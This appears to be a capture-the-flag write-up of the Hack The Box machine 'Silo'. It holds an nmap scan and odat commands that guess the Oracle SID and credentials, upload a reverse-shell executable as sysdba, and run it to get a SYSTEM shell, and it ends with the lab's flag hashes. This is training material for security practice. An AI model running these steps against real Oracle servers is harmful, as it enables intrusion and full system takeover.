```json
Alias: Silo
Date: 21-08_2024
Platform: Hackthebox
OS: Windows
Difficulty: Medium
Status: Complete
IP: 10.129.95.188
```

# Silo
# Summary

- Silo focuses mainly on leveraging Oracle to obtain a shell and escalate privileges. It was intended to be completed manually using various tools, however Oracle Database Attack Tool greatly simplifies the process, reducing the difficulty of the machine substantially.
 
---

# Information Gathering
## NMAP
```
Starting Nmap 7.95 ( https://nmap.org ) at 2024-08-21 12:25 PKT
Nmap scan report for 10.129.95.188
Host is up (0.15s latency).
Not shown: 987 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: IIS Windows Server
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  oracle-tns   Oracle TNS listener (requires service name)
49160/tcp open  msrpc        Microsoft Windows RPC
49161/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-08-21T07:40:10
|_  start_date: 2024-08-21T07:21:36
| smb2-security-mode:
|   3:0:2:
|_    Message signing enabled but not required
| smb-security-mode:
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: supported

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 887.04 seconds
```

---
# Enumeration

An Oracle server is running at it's default port 1521. We First need to find the SID of the database, which is just the service name of the database. We can use odat to do that.

```
odat sidguesser -s $IP
```

We will find the SID named `XE`

Next try to guess some passwords.

`odat passwordguesser -s $IP -d XE`

And we will find

| Username | Password |
| -------- | -------- |
| scott    | tiger    |

---

# Exploitation

Next we can try the java module for command execution:

`./odat.py java -s $IP -U scott -P tiger -d XE --exec COMMAND`

but this will fail, as java is not installed.

But we can try to connect as sysdba to upload a file and execute it.

Upload:
```bash
./odat.py utlfile -s $IP -d XE -U scott -P tiger --sysdba --putFile C:\\Windows\\system32\\spool\\drivers\\color friend.exe 14_188_4444_rev.exe
```

Execute:
```
./odat.py externaltable -s $IP -d XE -U scott -P tiger --sysdba --exec C:\\Windows\\system32\\spool\\drivers\\color friend.exe
```

And we get a shell as System!

---

# Flags
- 63729098027abe6d8b8ffada39b1ca81
- bdd56d9c6f484e919c58ed98e6676589

#CTF #CTF/Hackthebox #CTF/Hackthebox/Medium #Windows #Oracle